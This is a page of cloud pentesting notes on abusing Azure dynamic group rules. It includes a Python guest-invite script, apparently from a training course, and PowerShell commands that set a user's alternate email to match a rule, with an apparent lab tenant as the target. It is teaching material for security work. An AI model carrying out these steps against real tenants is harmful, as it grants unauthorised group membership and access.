---
title: Dynamic Groups
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/lateral-movement/dynamic-groups
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

With dynamic groups, you can create rules based on user or device properties to automatically join them to a dynamic group. For example, an organization may add users to a particular group based on their userPrincipalName, department, mail etc. When a group membership rule is applied, all users and device attributes are evaluated for matches.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FAOC4lp9H2XJ6eVpdjwdV%2Fupdate-dynamic-group-rule.png?alt=media&amp;token=b3a27aad-43d6-48d8-bd26-5a572ed85995" alt=""><figcaption></figcaption></figure>

### Guest invite abuse

1. Before joining a tenant as guest, if we can enumerate that a property (lets say email) is used in a rule, we can invite a guest with the email ID that matches rule rule.&#x20;
2. After joining a tenant. Manage profile -> change alternative email that matches rule.

Example rule:

```
(user.otherMails -any (_-contains "string"))
```

### Python script to invite a guest

{% code title="invite\_guest.py" lineNumbers="true" %}

```python
# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

import http.client
import json
import argparse

def get_access_token_with_username_password(client_id, tenant_id, username, password):

    scope = "openid profile offline_access https://graph.microsoft.com/.default"

    # Prepare the body for the POST request
    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"

    # Prepare headers
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    # Send the request
    conn = http.client.HTTPSConnection("login.microsoftonline.com")
    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)

    response = conn.getresponse()
    data = response.read()
    conn.close()

    # Parse and print the access token
    token_response = json.loads(data)

    if "access_token" in token_response:
        access_token = token_response['access_token']
        print("[+] Access token acquired successfully.")

        return access_token
    else:
        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
        return None

def invite_guest(access_token, external_username_email):

    print("[+] Inviting user...")
    # Set up the connection to Microsoft Graph
    conn = http.client.HTTPSConnection("graph.microsoft.com")

    # Define the API endpoint
    endpoint = "/v1.0/invitations"

    # Define the headers, including the Authorization header with the provided access token
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    # Define the body with the email of the guest and some additional optional parameters
    body = {
        "invitedUserEmailAddress": external_username_email,
        "inviteRedirectUrl": f"https://portal.azure.com",  # Update this URL to the actual app redirect URL
        "sendInvitationMessage": True,  # This will send the invite email to the user
        "invitedUserMessageInfo": {
            "customizedMessageBody": "You are invited to collaborate on DefCorp External project." # Update this message to your own message
        }
    }

    # Convert the body to a JSON string
    body_json = json.dumps(body)

    # Send the POST request to the Microsoft Graph API
    conn.request("POST", endpoint, body_json, headers)

    # Get the response from the server
    response = conn.getresponse()

    # Read the response data
    data = response.read()

    # Check if the request was successful
    if response.status == 201:
        # Parse the response data
        invitation_data = json.loads(data)
        invitation_link = invitation_data.get("inviteRedeemUrl")
        object_id = invitation_data.get("invitedUser", {}).get("id")
        print("[+] User invited successfully.\n")
        print(f"Object ID: {object_id}")
        print(f"Invitation link: {invitation_link}")
        return invitation_link
    else:
        # Print the error message if the request failed
        print("[-] Failed to invite user.")
        print(f"[-] Error {response.status}: {data.decode('utf-8')}")
        return None

def main():

    parser = argparse.ArgumentParser(description='Azure AD B2B Guest Invitation Script')
    # Add option to input external user email via argument
    parser.add_argument('--external-user', type=str, help='External user email to invite')

    # Parse command-line arguments
    args = parser.parse_args()

    if args.external_user:
        external_username_email = args.external_user
    else:
        external_username_email = "my-email@xx.onmicrosoft.com" # Add your own user email here.
        if not external_username_email:
            raise ValueError("External user email not provided")

    # Example usage
    client_id = "04b07795-8ddb-461a-bbee-xxx" # Public Client ID for Az CLI
    tenant_id = "b6e0615d-2c17-46b3-922c-xx" # Tenant ID of DefCorp IT
    username = "xx@xx.onmicrosoft.com"
    password = r"Password"

    # Get the access token using the username and password
    access_token = get_access_token_with_username_password(client_id, tenant_id, username, password)

    if access_token:
        invite_guest(access_token, external_username_email)
    else:
        print("[-] Failed to get access token.")
        exit()

if __name__ == '__main__':
    main()

```

{% endcode %}

### Change secondary e-mail

To match the dynamic group, update secondary email using connect-azaccount and fill in credentials including MFA

```
Connect-AzAccount -TenantId b6e0615d-2c17-46b3-922c-xxxxx
```

Next connect to Graph:

```powershell
PS C:\AzAD\Tools> $Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
PS C:\AzAD\Tools> Connect-MgGraph -AccessToken ($Token | ConvertToSecureString -AsPlainText -Force)
Welcome to Microsoft Graph!
[snip]
```

Update e-mail:

```powershell
Update-MgUser -UserId 4a3395c9-be40-44ba-aff2-xxx -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com
```

Check if you are now in the dynamic group
